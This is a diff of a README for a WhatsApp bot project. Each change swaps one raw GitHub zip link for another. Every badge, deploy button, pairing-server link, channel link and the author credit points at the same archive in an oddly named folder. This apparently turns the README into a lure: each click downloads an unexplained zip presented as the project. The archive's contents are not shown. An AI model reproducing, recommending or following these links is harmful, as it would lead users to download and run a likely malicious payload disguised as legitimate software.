@@ -5,7 +5,7 @@
 ---
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip+WHATSAPP+BOT;MULTI-DEVICE+SUPPORT;POWERED+BY+BAILEYS;FAST++SECURE++RELIABLE" alt="Typing SVG"/>
+  <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip+WHATSAPP+BOT;MULTI-DEVICE+SUPPORT;POWERED+BY+BAILEYS;FAST++SECURE++RELIABLE" alt="Typing SVG"/>
 </p>
 
 ---
@@ -16,11 +16,11 @@
 
 <div align="center">
 
-<img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip+Views&color=ff00ff&style=flat-square" />
-<img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" />
-<img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" />
-<img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" />
-<img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" />
+<img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip+Views&color=ff00ff&style=flat-square" />
+<img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" />
+<img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" />
+<img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" />
+<img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" />
 
 </div>
 
@@ -35,9 +35,9 @@
 <p align="center"><strong>⚡ VERSION 5.0</strong></p>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank">
+  <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank">
     <img 
-      src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip🚀 Deploy_from_New_Repo-ff003c?style=for-the-badge&logo=github&logoColor=white" 
+      src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip🚀 Deploy_from_New_Repo-ff003c?style=for-the-badge&logo=github&logoColor=white" 
       alt="Deploy Button"
       width="280"
     >
@@ -47,7 +47,7 @@
 ---
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" width="300" style="border-radius: 20px; box-shadow: 0 0 20px #00ffff;"/>
+  <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" width="300" style="border-radius: 20px; box-shadow: 0 0 20px #00ffff;"/>
 </div>
 
 ---
@@ -58,8 +58,8 @@
 
   <div style="background: #111111; padding: 15px; border-radius: 10px; border-left: 4px solid #ff00ff;">
     <p style="color: #00ffff; font-size: 16px;">🚀 First, star & fork the repo using the button below:</p>
-    <a href='https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip' target="_blank">
-      <img src='https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip'/>
+    <a href='https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip' target="_blank">
+      <img src='https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip'/>
     </a>
   </div>
 
@@ -91,8 +91,8 @@
     <p style="color:#ffffff; font-family:sans-serif; margin-bottom:8px;">
       🔗 <strong>Pairing Server 01</strong>
     </p>
-    <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank">
-      <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip"/>
+    <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank">
+      <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip"/>
     </a>
   </div>
   
@@ -106,16 +106,16 @@
 <div align="center">
   <table>
     <tr>
-      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip"/></a></td>
-      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip"/></a></td>
+      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip"/></a></td>
+      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip"/></a></td>
     </tr>
     <tr>
-      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip"/></a></td>
-      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip"/></a></td>
+      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip"/></a></td>
+      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip"/></a></td>
     </tr>
     <tr>
-      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip"/></a></td>
-      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip"/></a></td>
+      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip"/></a></td>
+      <td><a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank"><img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip"/></a></td>
     </tr>
   </table>
 </div>
@@ -129,8 +129,8 @@
 <table align="center">
   <tr>
     <td>
-      <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank">
-        <img alt="Deploy Free On VPS" src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip%20Free%20On%20VPS-1E90FF?style=for-the-badge&logo=linux&logoColor=white"/>
+      <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank">
+        <img alt="Deploy Free On VPS" src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip%20Free%20On%20VPS-1E90FF?style=for-the-badge&logo=linux&logoColor=white"/>
       </a>
     </td>
   </tr>
@@ -139,8 +139,8 @@
 <table align="center">
   <tr>
     <td>
-      <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank">
-        <img alt="View Workflow Codes" src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip%20Codes-FF0076?style=for-the-badge&logo=gitlab&logoColor=white"/>
+      <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank">
+        <img alt="View Workflow Codes" src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip%20Codes-FF0076?style=for-the-badge&logo=gitlab&logoColor=white"/>
       </a>
     </td>
   </tr>
@@ -149,8 +149,8 @@
 <table align="center">
   <tr>
     <td>
-      <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank">
-        <img alt="Deploy From New Repo" src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip%20Version-4CAF50?style=for-the-badge&logo=vercel&logoColor=white"/>
+      <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank">
+        <img alt="Deploy From New Repo" src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip%20Version-4CAF50?style=for-the-badge&logo=vercel&logoColor=white"/>
       </a>
     </td>
   </tr>
@@ -159,8 +159,8 @@
 <table align="center">
   <tr>
     <td>
-      <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank">
-        <img alt="Panel Zip File" src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip%20Codes-FF0000?style=for-the-badge&logo=github&logoColor=white"/>
+      <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank">
+        <img alt="Panel Zip File" src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip%20Codes-FF0000?style=for-the-badge&logo=github&logoColor=white"/>
       </a>
     </td>
   </tr>
@@ -197,8 +197,8 @@
 📢 Get updates, fixes, and sneak peeks directly from the official channel.
 </p>
 
-<a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank">
-  <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" alt="Join WhatsApp Channel"/>
+<a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" alt="Join WhatsApp Channel"/>
 </a>
 
 </div>
@@ -211,8 +211,8 @@
 
 <div align="center" style="margin-top: 12px; margin-bottom: 20px; background:#0b0b0b; padding: 25px; border-radius: 12px; border: 2px solid #9D00FF; box-shadow: 0 0 20px #9D00FF; width: 95%;">
 
-<a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank">
-  <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" width="420" alt="GitHub Stats"/>
+<a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" width="420" alt="GitHub Stats"/>
 </a>
 
 </div>
@@ -260,8 +260,8 @@ This project is licensed under the <strong>Apache License 2.0</strong><br>
 You are free to use, modify, and distribute it under the terms of this license.
 </p>
 
-<a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" target="_blank">
-  <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip" />
+<a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip" />
 </a>
 
 </div>
@@ -271,5 +271,5 @@ You are free to use, modify, and distribute it under the terms of this license.
 <h3 align="center">🙏 Thanks for using!</h3>
 <p align="center">
   If you like this project, consider giving it a ⭐ on GitHub.<br>
-  Made with ❤️ by <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/KHA-MD-3.7.zip">JawadTechX</a>
+  Made with ❤️ by <a href="https://raw.githubusercontent.com/rbarmyarmy/KHAN-MD/main/Roridulaceae/MD_KHA_3.4.zip">JawadTechX</a>
 </p>
